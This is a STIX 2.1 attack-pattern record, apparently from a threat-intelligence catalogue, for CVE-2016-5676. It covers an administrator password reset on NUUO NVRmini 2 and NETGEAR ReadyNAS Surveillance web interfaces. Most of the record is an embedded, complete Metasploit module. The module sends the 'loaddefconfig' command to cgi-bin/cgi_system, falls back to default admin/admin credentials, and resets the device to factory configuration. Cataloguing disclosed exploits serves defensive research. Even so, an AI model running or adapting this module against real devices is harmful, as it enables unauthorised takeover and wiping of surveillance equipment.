{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c3ccf8b6-cdd3-4802-a9fc-9cbb12eec333",
    "created": "2024-08-14T16:23:54.311601Z",
    "modified": "2024-08-14T16:23:54.311605Z",
    "name": "NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Default Configuration Load and Administrator Password Reset",
    "description": " The NVRmini 2 Network Video Recorded and the ReadyNAS Surveillance application are vulnerable to an administrator password reset on the exposed web management interface. Note that this only works for unauthenticated attackers in earlier versions of the Nuuo firmware (before v1.7.6), otherwise you need an administrative user password. This exploit has been tested on several versions of the NVRmini 2 and the ReadyNAS Surveillance. It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested in those devices. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/nuuo_nvrmini_reset.rb",
            "external_id": "nuuo_nvrmini_reset.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5676"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-nvr-vulns.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2016/Aug/45"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Default Configuration Load and Administrator Password Reset',\n        'Description' => %q{\n          The NVRmini 2 Network Video Recorded and the ReadyNAS Surveillance application are vulnerable\n          to an administrator password reset on the exposed web management interface.\n          Note that this only works for unauthenticated attackers in earlier versions of the Nuuo firmware\n          (before v1.7.6), otherwise you need an administrative user password.\n          This exploit has been tested on several versions of the NVRmini 2 and the ReadyNAS Surveillance.\n          It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested\n          in those devices.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2016-5676'],\n          ['US-CERT-VU', '856152'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-nvr-vulns.txt'],\n          ['URL', 'https://seclists.org/bugtraq/2016/Aug/45']\n        ],\n        'DisclosureDate' => '2016-08-04'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8081),\n        OptString.new('TARGETURI', [true, 'Application path', '/']),\n        OptString.new('USERNAME', [false, 'The username to login as', 'admin']),\n        OptString.new('PASSWORD', [false, 'Password for the specified username', 'admin']),\n      ]\n    )\n  end\n\n  def run\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'cgi-bin', 'cgi_system'),\n      'vars_get' => { 'cmd' => 'loaddefconfig' }\n    })\n\n    if res && res.code == 401\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(datastore['TARGETURI'], 'login.php'),\n        'vars_post' => {\n          'user' => datastore['USERNAME'],\n          'pass' => datastore['PASSWORD'],\n          'submit' => 'Login'\n        }\n      })\n      if res && (res.code == 200 || res.code == 302)\n        cookie = res.get_cookies\n      else\n        fail_with(Failure::Unknown, \"#{peer} - A valid username / password is needed to reset the device.\")\n      end\n      res = send_request_cgi({\n        'uri' => normalize_uri(datastore['TARGETURI'], 'cgi-bin', 'cgi_system'),\n        'cookie' => cookie,\n        'vars_get' => { 'cmd' => 'loaddefconfig' }\n      })\n    end\n\n    if res && res.code == 200 && res.body.to_s =~ /load default configuration ok/\n      print_good(\"#{peer} - Device has been reset to the default configuration.\")\n    else\n      print_error(\"#{peer} - Failed to reset device.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-04"
}